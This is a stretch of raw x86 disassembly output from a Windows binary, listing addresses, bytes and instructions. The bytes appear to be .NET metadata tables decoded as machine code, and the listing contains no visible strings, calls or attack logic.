  406395:	00 00                	add    %al,(%eax)
  406397:	00 96 00 91 19 9a    	add    %dl,-0x65e66f00(%esi)
  40639d:	00 12                	add    %dl,(%edx)
  40639f:	00 c8                	add    %cl,%al
  4063a1:	30 00                	xor    %al,(%eax)
  4063a3:	00 00                	add    %al,(%eax)
  4063a5:	00 91 00 08 0d 9a    	add    %dl,-0x65f2f800(%ecx)
  4063ab:	00 13                	add    %dl,(%ebx)
  4063ad:	00 35 21 00 00 00    	add    %dh,0x21
  4063b3:	00 91 18 0f 15 0a    	add    %dl,0xa150f18(%ecx)
  4063b9:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063bc:	10 31                	adc    %dh,(%ecx)
  4063be:	00 00                	add    %al,(%eax)
  4063c0:	00 00                	add    %al,(%eax)
  4063c2:	96                   	xchg   %eax,%esi
  4063c3:	00 15 0f 0a 00 14    	add    %dl,0x14000a0f
  4063c9:	00 78 20             	add    %bh,0x20(%eax)
  4063cc:	00 00                	add    %al,(%eax)
  4063ce:	00 00                	add    %al,(%eax)
  4063d0:	86 18                	xchg   %bl,(%eax)
  4063d2:	09 15 0e 00 14 00    	or     %edx,0x14000e
  4063d8:	41                   	inc    %ecx
  4063d9:	21 00                	and    %eax,(%eax)
  4063db:	00 00                	add    %al,(%eax)
  4063dd:	00 96 00 47 17 0a    	add    %dl,0xa174700(%esi)
  4063e3:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063e6:	f8                   	clc
  4063e7:	33 00                	xor    (%eax),%eax
  4063e9:	00 00                	add    %al,(%eax)
  4063eb:	00 91 00 64 0e 1d    	add    %dl,0x1d0e6400(%ecx)
  4063f1:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063f4:	50                   	push   %eax
  4063f5:	34 00                	xor    $0x0,%al
  4063f7:	00 00                	add    %al,(%eax)
  4063f9:	00 91 00 70 02 1d    	add    %dl,0x1d027000(%ecx)
  4063ff:	00 14 00             	add    %dl,(%eax,%eax,1)
  406402:	a0 34 00 00 00       	mov    0x34,%al
  406407:	00 91 00 53 14 1d    	add    %dl,0x1d145300(%ecx)
  40640d:	00 14 00             	add    %dl,(%eax,%eax,1)
  406410:	dc 35 00 00 00 00    	fdivl  0x0
  406416:	91                   	xchg   %eax,%ecx
  406417:	00 ef                	add    %ch,%bh
  406419:	13 1d 00 14 00 20    	adc    0x20001400,%ebx
  40641f:	36 00 00             	add    %al,%ss:(%eax)
  406422:	00 00                	add    %al,(%eax)
  406424:	91                   	xchg   %eax,%ecx
  406425:	00 8f 05 1d 00 14    	add    %cl,0x14001d05(%edi)
  40642b:	00 78 20             	add    %bh,0x20(%eax)
  40642e:	00 00                	add    %al,(%eax)
  406430:	00 00                	add    %al,(%eax)
  406432:	86 18                	xchg   %bl,(%eax)
  406434:	09 15 0e 00 14 00    	or     %edx,0x14000e
  40643a:	6c                   	insb   (%dx),%es:(%edi)
  40643b:	36 00 00             	add    %al,%ss:(%eax)
  40643e:	00 00                	add    %al,(%eax)
  406440:	96                   	xchg   %eax,%esi
  406441:	00 ef                	add    %ch,%bh
  406443:	01 c3                	add    %eax,%ebx
  406445:	00 14 00             	add    %dl,(%eax,%eax,1)
  406448:	f0 36 00 00          	lock add %al,%ss:(%eax)
  40644c:	00 00                	add    %al,(%eax)
  40644e:	96                   	xchg   %eax,%esi
  40644f:	00 37                	add    %dh,(%edi)
  406451:	0d c7 00 14 00       	or     $0x1400c7,%eax
  406456:	5c                   	pop    %esp
  406457:	37                   	aaa
  406458:	00 00                	add    %al,(%eax)
  40645a:	00 00                	add    %al,(%eax)
  40645c:	96                   	xchg   %eax,%esi
  40645d:	00 1c 12             	add    %bl,(%edx,%edx,1)
  406460:	53                   	push   %ebx
  406461:	00 15 00 7b 21 00    	add    %dl,0x217b00
  406467:	00 00                	add    %al,(%eax)
  406469:	00 96 00 df 10 1d    	add    %dl,0x1d10df00(%esi)
  40646f:	00 15 00 18 39 00    	add    %dl,0x391800
  406475:	00 00                	add    %al,(%eax)
  406477:	00 96 00 ef 19 0a    	add    %dl,0xa19ef00(%esi)
  40647d:	00 15 00 90 39 00    	add    %dl,0x399000
  406483:	00 00                	add    %al,(%eax)
  406485:	00 96 00 bb 18 c3    	add    %dl,-0x3ce74500(%esi)
  40648b:	00 15 00 7c 3a 00    	add    %dl,0x3a7c00
  406491:	00 00                	add    %al,(%eax)
  406493:	00 96 00 8b 13 d5    	add    %dl,-0x2aec7500(%esi)
  406499:	00 15 00 c4 3a 00    	add    %dl,0x3ac400
  40649f:	00 00                	add    %al,(%eax)
  4064a1:	00 96 00 81 12 0a    	add    %dl,0xa128100(%esi)
  4064a7:	00 16                	add    %dl,(%esi)
  4064a9:	00 f8                	add    %bh,%al
  4064ab:	3a 00                	cmp    (%eax),%al
  4064ad:	00 00                	add    %al,(%eax)
  4064af:	00 96 00 97 06 c3    	add    %dl,-0x3cf96900(%esi)
  4064b5:	00 16                	add    %dl,(%esi)
  4064b7:	00 54 3b 00          	add    %dl,0x0(%ebx,%edi,1)
  4064bb:	00 00                	add    %al,(%eax)
  4064bd:	00 96 00 40 1c 1d    	add    %dl,0x1d1c4000(%esi)
  4064c3:	00 16                	add    %dl,(%esi)
  4064c5:	00 91 21 00 00 00    	add    %dl,0x21(%ecx)
  4064cb:	00 96 00 35 1c 0a    	add    %dl,0xa1c3500(%esi)
  4064d1:	00 16                	add    %dl,(%esi)
  4064d3:	00 00                	add    %al,(%eax)
  4064d5:	00 00                	add    %al,(%eax)
  4064d7:	00 80 00 96 20 08    	add    %al,0x8209600(%eax)
  4064dd:	1c e0                	sbb    $0xe0,%al
  4064df:	00 16                	add    %dl,(%esi)
  4064e1:	00 00                	add    %al,(%eax)
  4064e3:	00 00                	add    %al,(%eax)
  4064e5:	00 80 00 96 20 f3    	add    %al,-0xcdf6a00(%eax)
  4064eb:	1b e4                	sbb    %esp,%esp
  4064ed:	00 16                	add    %dl,(%esi)
  4064ef:	00 00                	add    %al,(%eax)
  4064f1:	00 00                	add    %al,(%eax)
  4064f3:	00 80 00 96 20 f0    	add    %al,-0xfdf6a00(%eax)
  4064f9:	05 ec 00 19 00       	add    $0x1900ec,%eax
  4064fe:	00 00                	add    %al,(%eax)
  406500:	00 00                	add    %al,(%eax)
  406502:	80 00 96             	addb   $0x96,(%eax)
  406505:	20 09                	and    %cl,(%ecx)
  406507:	1b f1                	sbb    %ecx,%esi
  406509:	00 1a                	add    %bl,(%edx)
  40650b:	00 00                	add    %al,(%eax)
  40650d:	00 00                	add    %al,(%eax)
  40650f:	00 80 00 96 20 c4    	add    %al,-0x3bdf6a00(%eax)
  406515:	08 f8                	or     %bh,%al
  406517:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40651a:	00 00                	add    %al,(%eax)
  40651c:	00 00                	add    %al,(%eax)
  40651e:	80 00 96             	addb   $0x96,(%eax)
  406521:	20 86 0e ff 00 1d    	and    %al,0x1d00ff0e(%esi)
  406527:	00 ad 21 00 00 00    	add    %ch,0x21(%ebp)
  40652d:	00 96 00 cf 0b 1c    	add    %dl,0x1c0bcf00(%esi)
  406533:	01 20                	add    %esp,(%eax)
  406535:	00 74 3b 00          	add    %dh,0x0(%ebx,%edi,1)
  406539:	00 00                	add    %al,(%eax)
  40653b:	00 96 00 71 19 0a    	add    %dl,0xa197100(%esi)
  406541:	00 22                	add    %ah,(%edx)
  406543:	00 bc 3b 00 00 00 00 	add    %bh,0x0(%ebx,%edi,1)
  40654a:	96                   	xchg   %eax,%esi
  40654b:	00 f7                	add    %dh,%bh
  40654d:	19 0a                	sbb    %ecx,(%edx)
  40654f:	00 22                	add    %ah,(%edx)
  406551:	00 f4                	add    %dh,%ah
  406553:	3b 00                	cmp    (%eax),%eax
  406555:	00 00                	add    %al,(%eax)
  406557:	00 96 00 c2 0a 23    	add    %dl,0x230ac200(%esi)
  40655d:	01 22                	add    %esp,(%edx)
  40655f:	00 60 3c             	add    %ah,0x3c(%eax)
  406562:	00 00                	add    %al,(%eax)
  406564:	00 00                	add    %al,(%eax)
  406566:	96                   	xchg   %eax,%esi
  406567:	00 b9 0a 2a 01 24    	add    %bh,0x24012a0a(%ecx)
  40656d:	00 cc                	add    %cl,%ah
  40656f:	3c 00                	cmp    $0x0,%al
  406571:	00 00                	add    %al,(%eax)
  406573:	00 96 00 a2 0a 84    	add    %dl,-0x7bf55e00(%esi)
  406579:	00 25 00 34 3d 00    	add    %ah,0x3d3400
  40657f:	00 00                	add    %al,(%eax)
  406581:	00 96 00 b6 1c 1d    	add    %dl,0x1d1cb600(%esi)
  406587:	00 26                	add    %ah,(%esi)
  406589:	00 cd                	add    %cl,%ch
  40658b:	21 00                	and    %eax,(%eax)
  40658d:	00 00                	add    %al,(%eax)
  40658f:	00 91 18 0f 15 0a    	add    %dl,0xa150f18(%ecx)
  406595:	00 26                	add    %ah,(%esi)
  406597:	00 a0 3d 00 00 00    	add    %ah,0x3d(%eax)
  40659d:	00 96 00 16 03 9a    	add    %dl,-0x65fcea00(%esi)
  4065a3:	00 26                	add    %ah,(%esi)
  4065a5:	00 d4                	add    %dl,%ah
  4065a7:	3f                   	aas
  4065a8:	00 00                	add    %al,(%eax)
  4065aa:	00 00                	add    %al,(%eax)
  4065ac:	91                   	xchg   %eax,%ecx
  4065ad:	00 9f 05 38 01 27    	add    %bl,0x27013805(%edi)
  4065b3:	00 e3                	add    %ah,%bl
  4065b5:	21 00                	and    %eax,(%eax)
  4065b7:	00 00                	add    %al,(%eax)
  4065b9:	00 91 00 6c 03 0a    	add    %dl,0xa036c00(%ecx)
  4065bf:	00 28                	add    %ch,(%eax)
  4065c1:	00 13                	add    %dl,(%ebx)
  4065c3:	22 00                	and    (%eax),%al
  4065c5:	00 00                	add    %al,(%eax)
  4065c7:	00 96 00 a5 14 3e    	add    %dl,0x3e14a500(%esi)
  4065cd:	01 28                	add    %ebp,(%eax)
  4065cf:	00 4a 22             	add    %cl,0x22(%edx)
  4065d2:	00 00                	add    %al,(%eax)
  4065d4:	00 00                	add    %al,(%eax)
  4065d6:	91                   	xchg   %eax,%ecx
  4065d7:	18 0f                	sbb    %cl,(%edi)
  4065d9:	15 0a 00 29 00       	adc    $0x29000a,%eax
  4065de:	f4                   	hlt
  4065df:	40                   	inc    %eax
  4065e0:	00 00                	add    %al,(%eax)
  4065e2:	00 00                	add    %al,(%eax)
  4065e4:	86 18                	xchg   %bl,(%eax)
  4065e6:	09 15 6b 01 29 00    	or     %edx,0x29016b
  4065ec:	56                   	push   %esi
  4065ed:	22 00                	and    (%eax),%al
  4065ef:	00 00                	add    %al,(%eax)
  4065f1:	00 86 00 80 1b 70    	add    %al,0x701b8000(%esi)
  4065f7:	01 2a                	add    %ebp,(%edx)
  4065f9:	00 6c 41 00          	add    %ch,0x0(%ecx,%eax,2)
  4065fd:	00 00                	add    %al,(%eax)
  4065ff:	00 86 00 80 1b 75    	add    %al,0x751b8000(%esi)
  406605:	01 2b                	add    %ebp,(%ebx)
  406607:	00 6e 22             	add    %ch,0x22(%esi)
  40660a:	00 00                	add    %al,(%eax)
  40660c:	00 00                	add    %al,(%eax)
  40660e:	86 00                	xchg   %al,(%eax)
  406610:	78 1b                	js     0x40662d
  406612:	70 01                	jo     0x406615
  406614:	2c 00                	sub    $0x0,%al
  406616:	c4 42 00             	les    0x0(%edx),%eax
  406619:	00 00                	add    %al,(%eax)
  40661b:	00 86 00 78 1b 75    	add    %al,0x751b7800(%esi)
  406621:	01 2d 00 84 44 00    	add    %ebp,0x448400
  406627:	00 48 00             	add    %cl,0x0(%eax)
  40662a:	81 00 eb 0e 7c 01    	addl   $0x17c0eeb,(%eax)
  406630:	2e 00 86 22 00 00 00 	add    %al,%cs:0x22(%esi)
  406637:	00 91 18 0f 15 0a    	add    %dl,0xa150f18(%ecx)
  40663d:	00 30                	add    %dh,(%eax)
  40663f:	00 b4 44 00 00 00 00 	add    %dh,0x0(%esp,%eax,2)
  406646:	96                   	xchg   %eax,%esi
  406647:	00 21                	add    %ah,(%ecx)
  406649:	0d c7 00 30 00       	or     $0x3000c7,%eax
  40664e:	40                   	inc    %eax
  40664f:	45                   	inc    %ebp
  406650:	00 00                	add    %al,(%eax)
  406652:	00 00                	add    %al,(%eax)
  406654:	96                   	xchg   %eax,%esi
  406655:	00 21                	add    %ah,(%ecx)
  406657:	0d 84 01 31 00       	or     $0x310184,%eax
  40665c:	9f                   	lahf
  40665d:	22 00                	and    (%eax),%al
  40665f:	00 00                	add    %al,(%eax)
  406661:	00 96 00 46 16 2a    	add    %dl,0x2a164600(%esi)
  406667:	01 32                	add    %esi,(%edx)
  406669:	00 ac 22 00 00 00 00 	add    %ch,0x0(%edx,%eiz,1)
  406670:	96                   	xchg   %eax,%esi
  406671:	00 b7 0c 93 01 33    	add    %dh,0x3301930c(%edi)
  406677:	00 80 45 00 00 00    	add    %al,0x45(%eax)
  40667d:	00 96 00 91 0c 93    	add    %dl,-0x6cf36f00(%esi)
  406683:	01 34 00             	add    %esi,(%eax,%eax,1)
  406686:	c8 45 00 00          	enter  $0x45,$0x0
  40668a:	00 00                	add    %al,(%eax)
  40668c:	96                   	xchg   %eax,%esi
  40668d:	00 c1                	add    %al,%cl
  40668f:	0c 93                	or     $0x93,%al
  406691:	01 35 00 10 46 00    	add    %esi,0x461000
  406697:	00 00                	add    %al,(%eax)
  406699:	00 96 00 8d 16 84    	add    %dl,-0x7be97300(%esi)
  40669f:	01 36                	add    %esi,(%esi)
  4066a1:	00 b9 22 00 00 00    	add    %bh,0x22(%ecx)
  4066a7:	00 96 00 d6 00 99    	add    %dl,-0x66ff2a00(%esi)
  4066ad:	01 37                	add    %esi,(%edi)
  4066af:	00 c6                	add    %al,%dh
  4066b1:	22 00                	and    (%eax),%al
  4066b3:	00 00                	add    %al,(%eax)
  4066b5:	00 96 00 76 00 9f    	add    %dl,-0x60ff8a00(%esi)
  4066bb:	01 38                	add    %edi,(%eax)
  4066bd:	00 ea                	add    %ch,%dl
  4066bf:	22 00                	and    (%eax),%al
  4066c1:	00 00                	add    %al,(%eax)
  4066c3:	00 96 00 f1 00 a5    	add    %dl,-0x5aff0f00(%esi)
  4066c9:	01 39                	add    %edi,(%ecx)
  4066cb:	00 fe                	add    %bh,%dh
  4066cd:	22 00                	and    (%eax),%al
  4066cf:	00 00                	add    %al,(%eax)
  4066d1:	00 96 00 c7 05 ab    	add    %dl,-0x54fa3900(%esi)
  4066d7:	01 3a                	add    %edi,(%edx)
  4066d9:	00 78 20             	add    %bh,0x20(%eax)
  4066dc:	00 00                	add    %al,(%eax)
  4066de:	00 00                	add    %al,(%eax)
  4066e0:	86 18                	xchg   %bl,(%eax)
  4066e2:	09 15 0e 00 3b 00    	or     %edx,0x3b000e
  4066e8:	0b 23                	or     (%ebx),%esp
  4066ea:	00 00                	add    %al,(%eax)
  4066ec:	00 00                	add    %al,(%eax)
  4066ee:	91                   	xchg   %eax,%ecx
  4066ef:	18 0f                	sbb    %cl,(%edi)
  4066f1:	15 0a 00 3b 00       	adc    $0x3b000a,%eax
  4066f6:	17                   	pop    %ss
  4066f7:	23 00                	and    (%eax),%eax
  4066f9:	00 00                	add    %al,(%eax)
  4066fb:	00 86 18 09 15 b1    	add    %al,-0x4eeaf6e8(%esi)
  406701:	01 3b                	add    %edi,(%ebx)
  406703:	00 2d 23 00 00 00    	add    %ch,0x23
  406709:	00 e1                	add    %ah,%cl
  40670b:	09 d3                	or     %edx,%ebx
  40670d:	1a bb 01 3c 00 40    	sbb    0x40003c01(%ebx),%bh
  406713:	23 00                	and    (%eax),%eax
  406715:	00 00                	add    %al,(%eax)
  406717:	00 e1                	add    %ah,%cl
  406719:	01 bf 1b bf 01 3c    	add    %edi,0x3c01bf1b(%edi)
  40671f:	00 63 23             	add    %ah,0x23(%ebx)
  406722:	00 00                	add    %al,(%eax)
  406724:	00 00                	add    %al,(%eax)
  406726:	e1 01                	loope  0x406729
  406728:	ae                   	scas   %es:(%edi),%al
  406729:	19 0e                	sbb    %ecx,(%esi)
  40672b:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40672e:	6c                   	insb   (%dx),%es:(%edi)
  40672f:	23 00                	and    (%eax),%eax
  406731:	00 00                	add    %al,(%eax)
  406733:	00 86 18 09 15 cb    	add    %al,-0x34eaf6e8(%esi)
  406739:	01 3c 00             	add    %edi,(%eax,%eax,1)
  40673c:	82 23 00             	andb   $0x0,(%ebx)
  40673f:	00 00                	add    %al,(%eax)
  406741:	00 86 00 2c 03 d7    	add    %al,-0x28fcd400(%esi)
  406747:	01 3e                	add    %edi,(%esi)
  406749:	00 8f 23 00 00 00    	add    %cl,0x23(%edi)
  40674f:	00 86 00 2c 03 dc    	add    %al,-0x23fcd400(%esi)
  406755:	01 3e                	add    %edi,(%esi)
  406757:	00 a3 23 00 00 00    	add    %ah,0x23(%ebx)
  40675d:	00 86 00 2c 03 e2    	add    %al,-0x1dfcd400(%esi)
  406763:	01 3f                	add    %edi,(%edi)
  406765:	00 b7 23 00 00 00    	add    %dh,0x23(%edi)
  40676b:	00 86 00 2c 03 e8    	add    %al,-0x17fcd400(%esi)
  406771:	01 40 00             	add    %eax,0x0(%eax)
  406774:	cb                   	lret
  406775:	23 00                	and    (%eax),%eax
  406777:	00 00                	add    %al,(%eax)
  406779:	00 86 08 d9 0f ee    	add    %al,-0x11f026f8(%esi)
  40677f:	01 41 00             	add    %eax,0x0(%ecx)
  406782:	d9 23                	fldenv (%ebx)
  406784:	00 00                	add    %al,(%eax)
  406786:	00 00                	add    %al,(%eax)
  406788:	86 08                	xchg   %cl,(%eax)
  40678a:	85 0d f4 01 42 00    	test   %ecx,0x4201f4
  406790:	e6 23                	out    %al,$0x23
  406792:	00 00                	add    %al,(%eax)
  406794:	00 00                	add    %al,(%eax)
  406796:	81 00 96 07 6b 01    	addl   $0x16b0796,(%eax)
  40679c:	42                   	inc    %edx
  40679d:	00 48 46             	add    %cl,0x46(%eax)
  4067a0:	00 00                	add    %al,(%eax)
  4067a2:	00 00                	add    %al,(%eax)
  4067a4:	81 00 ce 12 0e 00    	addl   $0xe12ce,(%eax)
  4067aa:	43                   	inc    %ebx
  4067ab:	00 8c 46 00 00 00 00 	add    %cl,0x0(%esi,%eax,2)
  4067b2:	81 00 27 03 d7 01    	addl   $0x1d70327,(%eax)
  4067b8:	43                   	inc    %ebx
  4067b9:	00 b4 46 00 00 00 00 	add    %dh,0x0(%esi,%eax,2)
  4067c0:	81 00 71 0b 0a 02    	addl   $0x20a0b71,(%eax)
  4067c6:	43                   	inc    %ebx
  4067c7:	00 30                	add    %dh,(%eax)
  4067c9:	47                   	inc    %edi
  4067ca:	00 00                	add    %al,(%eax)
  4067cc:	00 00                	add    %al,(%eax)
  4067ce:	86 00                	xchg   %al,(%eax)
  4067d0:	18 19                	sbb    %bl,(%ecx)
  4067d2:	dc 01                	faddl  (%ecx)
  4067d4:	44                   	inc    %esp
  4067d5:	00 00                	add    %al,(%eax)
  4067d7:	24 00                	and    $0x0,%al
  4067d9:	00 00                	add    %al,(%eax)
  4067db:	00 81 00 a5 04 d7    	add    %al,-0x28fb5b00(%ecx)
  4067e1:	01 45 00             	add    %eax,0x0(%ebp)
  4067e4:	21 24 00             	and    %esp,(%eax,%eax,1)
  4067e7:	00 00                	add    %al,(%eax)
  4067e9:	00 81 00 b6 04 d7    	add    %al,-0x28fb4a00(%ecx)
  4067ef:	01 45 00             	add    %eax,0x0(%ebp)
  4067f2:	42                   	inc    %edx
  4067f3:	24 00                	and    $0x0,%al
  4067f5:	00 00                	add    %al,(%eax)
  4067f7:	00 86 00 bb 04 d7    	add    %al,-0x28fb4500(%esi)
  4067fd:	01 45 00             	add    %eax,0x0(%ebp)
  406800:	5c                   	pop    %esp
  406801:	47                   	inc    %edi
  406802:	00 00                	add    %al,(%eax)
  406804:	00 00                	add    %al,(%eax)
  406806:	81 00 78 12 0f 02    	addl   $0x20f1278,(%eax)
  40680c:	45                   	inc    %ebp
  40680d:	00 24 48             	add    %ah,(%eax,%ecx,2)
  406810:	00 00                	add    %al,(%eax)
  406812:	00 00                	add    %al,(%eax)
  406814:	81 00 52 1c 0f 02    	addl   $0x20f1c52,(%eax)
  40681a:	46                   	inc    %esi
  40681b:	00 4a 24             	add    %cl,0x24(%edx)
  40681e:	00 00                	add    %al,(%eax)
  406820:	00 00                	add    %al,(%eax)
  406822:	86 00                	xchg   %al,(%eax)
  406824:	e2 13                	loop   0x406839
  406826:	15 02 47 00 5f       	adc    $0x5f004702,%eax
  40682b:	24 00                	and    $0x0,%al
  40682d:	00 00                	add    %al,(%eax)
  40682f:	00 86 00 c2 00 1a    	add    %al,0x1a00c200(%esi)
  406835:	02 48 00             	add    0x0(%eax),%cl
  406838:	d8 48 00             	fmuls  0x0(%eax)
  40683b:	00 00                	add    %al,(%eax)
  40683d:	00 86 00 b6 00 1f    	add    %al,0x1f00b600(%esi)
  406843:	02 49 00             	add    0x0(%ecx),%cl
  406846:	80 49 00 00          	orb    $0x0,0x0(%ecx)
  40684a:	00 00                	add    %al,(%eax)
  40684c:	86 00                	xchg   %al,(%eax)
  40684e:	d5 13                	aad    $0x13
  406850:	23 02                	and    (%edx),%eax
  406852:	49                   	dec    %ecx
  406853:	00 28                	add    %ch,(%eax)
  406855:	4a                   	dec    %edx
  406856:	00 00                	add    %al,(%eax)
  406858:	00 00                	add    %al,(%eax)
  40685a:	86 00                	xchg   %al,(%eax)
  40685c:	02 19                	add    (%ecx),%bl
  40685e:	27                   	daa
  40685f:	02 49 00             	add    0x0(%ecx),%cl
  406862:	74 24                	je     0x406888
  406864:	00 00                	add    %al,(%eax)
  406866:	00 00                	add    %al,(%eax)
  406868:	86 00                	xchg   %al,(%eax)
  40686a:	b2 16                	mov    $0x16,%dl
  40686c:	2b 02                	sub    (%edx),%eax
  40686e:	49                   	dec    %ecx
  40686f:	00 bc 4a 00 00 00 00 	add    %bh,0x0(%edx,%ecx,2)
  406876:	86 00                	xchg   %al,(%eax)
  406878:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406879:	16                   	push   %ss
  40687a:	31 02                	xor    %eax,(%edx)
  40687c:	4a                   	dec    %edx
  40687d:	00 85 24 00 00 00    	add    %al,0x24(%ebp)
  406883:	00 86 00 2c 03 36    	add    %al,0x36032c00(%esi)
  406889:	02 4a 00             	add    0x0(%edx),%cl
  40688c:	9a 24 00 00 00 00 86 	lcall  $0x8600,$0x24
  406893:	00 2c 03             	add    %ch,(%ebx,%eax,1)
  406896:	3c 02                	cmp    $0x2,%al
  406898:	4c                   	dec    %esp
  406899:	00 6c 4b 00          	add    %ch,0x0(%ebx,%ecx,2)
  40689d:	00 00                	add    %al,(%eax)
  40689f:	00 86 00 97 16 42    	add    %al,0x42169700(%esi)
  4068a5:	02 4e 00             	add    0x0(%esi),%cl
  4068a8:	c4 4b 00             	les    0x0(%ebx),%ecx
  4068ab:	00 00                	add    %al,(%eax)
  4068ad:	00 86 00 6b 06 42    	add    %al,0x42066b00(%esi)
  4068b3:	02 4f 00             	add    0x0(%edi),%cl
  4068b6:	10 4c 00 00          	adc    %cl,0x0(%eax,%eax,1)
  4068ba:	00 00                	add    %al,(%eax)
  4068bc:	86 00                	xchg   %al,(%eax)
  4068be:	38 19                	cmp    %bl,(%ecx)
  4068c0:	dc 01                	faddl  (%ecx)
  4068c2:	50                   	push   %eax
  4068c3:	00 b0 24 00 00 00    	add    %dh,0x24(%eax)
  4068c9:	00 86 00 53 0f 0e    	add    %al,0xe0f5300(%esi)
  4068cf:	00 51 00             	add    %dl,0x0(%ecx)
  4068d2:	c6                   	(bad)
  4068d3:	24 00                	and    $0x0,%al
  4068d5:	00 00                	add    %al,(%eax)
  4068d7:	00 86 00 ab 0c 6b    	add    %al,0x6b0cab00(%esi)
  4068dd:	01 51 00             	add    %edx,0x0(%ecx)
  4068e0:	d6                   	salc
  4068e1:	24 00                	and    $0x0,%al
  4068e3:	00 00                	add    %al,(%eax)
  4068e5:	00 86 00 9f 0c 47    	add    %al,0x470c9f00(%esi)
  4068eb:	02 52 00             	add    0x0(%edx),%dl
  4068ee:	f4                   	hlt
  4068ef:	24 00                	and    $0x0,%al
  4068f1:	00 00                	add    %al,(%eax)
  4068f3:	00 86 00 83 10 4b    	add    %al,0x4b108300(%esi)
  4068f9:	02 52 00             	add    0x0(%edx),%dl
  4068fc:	09 25 00 00 00 00    	or     %esp,0x0
  406902:	86 00                	xchg   %al,(%eax)
  406904:	44                   	inc    %esp
  406905:	06                   	push   %es
  406906:	50                   	push   %eax
  406907:	02 53 00             	add    0x0(%ebx),%dl
  40690a:	1f                   	pop    %ds
  40690b:	25 00 00 00 00       	and    $0x0,%eax
  406910:	86 00                	xchg   %al,(%eax)
  406912:	0d 19 55 02 54       	or     $0x54025519,%eax
  406917:	00 cc                	add    %cl,%ah
  406919:	4c                   	dec    %esp
  40691a:	00 00                	add    %al,(%eax)
  40691c:	00 00                	add    %al,(%eax)
  40691e:	86 00                	xchg   %al,(%eax)
  406920:	7d 16                	jge    0x406938
  406922:	2b 02                	sub    (%edx),%eax
  406924:	55                   	push   %ebp
  406925:	00 24 4d 00 00 00 00 	add    %ah,0x0(,%ecx,2)
  40692c:	86 00                	xchg   %al,(%eax)
  40692e:	5c                   	pop    %esp
  40692f:	06                   	push   %es
  406930:	6b 01 56             	imul   $0x56,(%ecx),%eax
  406933:	00 48 4d             	add    %cl,0x4d(%eax)
  406936:	00 00                	add    %al,(%eax)
  406938:	00 00                	add    %al,(%eax)
  40693a:	86 00                	xchg   %al,(%eax)
  40693c:	9b                   	fwait
  40693d:	0f                   	(bad)
  40693e:	0f 02 57 00          	lar    0x0(%edi),%edx
  406942:	5c                   	pop    %esp
  406943:	53                   	push   %ebx
  406944:	00 00                	add    %al,(%eax)
  406946:	00 00                	add    %al,(%eax)
  406948:	86 00                	xchg   %al,(%eax)
  40694a:	39 16                	cmp    %edx,(%esi)
  40694c:	31 02                	xor    %eax,(%edx)
  40694e:	58                   	pop    %eax
  40694f:	00 c8                	add    %cl,%al
  406951:	53                   	push   %ebx
  406952:	00 00                	add    %al,(%eax)
  406954:	00 00                	add    %al,(%eax)
  406956:	86 00                	xchg   %al,(%eax)
  406958:	6a 0f                	push   $0xf
  40695a:	0f 02 58 00          	lar    0x0(%eax),%ebx
  40695e:	34 25                	xor    $0x25,%al
  406960:	00 00                	add    %al,(%eax)
  406962:	00 00                	add    %al,(%eax)
  406964:	86 08                	xchg   %cl,(%eax)
  406966:	77 0c                	ja     0x406974
  406968:	47                   	inc    %edi
  406969:	02 59 00             	add    0x0(%ecx),%bl
  40696c:	3c 25                	cmp    $0x25,%al
  40696e:	00 00                	add    %al,(%eax)
  406970:	00 00                	add    %al,(%eax)
  406972:	86 08                	xchg   %cl,(%eax)
  406974:	84 0c 6b             	test   %cl,(%ebx,%ebp,2)
  406977:	01 59 00             	add    %ebx,0x0(%ecx)
  40697a:	45                   	inc    %ebp
  40697b:	25 00 00 00 00       	and    $0x0,%eax
  406980:	86 08                	xchg   %cl,(%eax)
  406982:	b9 13 23 02 5a       	mov    $0x5a022313,%ecx
  406987:	00 4d 25             	add    %cl,0x25(%ebp)
  40698a:	00 00                	add    %al,(%eax)
  40698c:	00 00                	add    %al,(%eax)
  40698e:	86 08                	xchg   %cl,(%eax)
  406990:	c7                   	(bad)
  406991:	13 15 02 5a 00 56    	adc    0x56005a02,%edx
  406997:	25 00 00 00 00       	and    $0x0,%eax
  40699c:	86 08                	xchg   %cl,(%eax)
  40699e:	ea 18 27 02 5b 00 5e 	ljmp   $0x5e00,$0x5b022718
  4069a5:	25 00 00 00 00       	and    $0x0,%eax
  4069aa:	86 08                	xchg   %cl,(%eax)
  4069ac:	f6 18                	negb   (%eax)
  4069ae:	55                   	push   %ebp
  4069af:	02 5b 00             	add    0x0(%ebx),%bl
  4069b2:	c0 54 00 00 00       	rclb   $0x0,0x0(%eax,%eax,1)
  4069b7:	00 86 08 82 1c 5a    	add    %al,0x5a1c8208(%esi)
  4069bd:	02 5c 00 67          	add    0x67(%eax,%eax,1),%bl
  4069c1:	25 00 00 00 00       	and    $0x0,%eax
  4069c6:	86 08                	xchg   %cl,(%eax)
  4069c8:	fe 07                	incb   (%edi)
  4069ca:	5f                   	pop    %edi
  4069cb:	02 5c 00 6f          	add    0x6f(%eax,%eax,1),%bl
  4069cf:	25 00 00 00 00       	and    $0x0,%eax
  4069d4:	e1 01                	loope  0x4069d7
  4069d6:	d2 14 64             	rclb   %cl,(%esp,%eiz,2)
  4069d9:	02 5c 00 7c          	add    0x7c(%eax,%eax,1),%bl
  4069dd:	25 00 00 00 00       	and    $0x0,%eax
  4069e2:	86 18                	xchg   %bl,(%eax)
  4069e4:	09 15 0e 00 5c 00    	or     %edx,0x5c000e
  4069ea:	20 55 00             	and    %dl,0x0(%ebp)
  4069ed:	00 00                	add    %al,(%eax)
  4069ef:	00 96 00 48 0c b1    	add    %dl,-0x4ef3b800(%esi)
  4069f5:	02 5c 00 8f          	add    -0x71(%eax,%eax,1),%bl
  4069f9:	25 00 00 00 00       	and    $0x0,%eax
  4069fe:	96                   	xchg   %eax,%esi
  4069ff:	00 48 0c             	add    %cl,0xc(%eax)
  406a02:	b8 02 5e 00 44       	mov    $0x44005e02,%eax
  406a07:	55                   	push   %ebp
  406a08:	00 00                	add    %al,(%eax)
  406a0a:	00 00                	add    %al,(%eax)
  406a0c:	96                   	xchg   %eax,%esi
  406a0d:	00 48 0c             	add    %cl,0xc(%eax)
  406a10:	be 02 5f 00 78       	mov    $0x78005f02,%esi
  406a15:	20 00                	and    %al,(%eax)
  406a17:	00 00                	add    %al,(%eax)
  406a19:	00 86 18 09 15 0e    	add    %al,0xe150918(%esi)
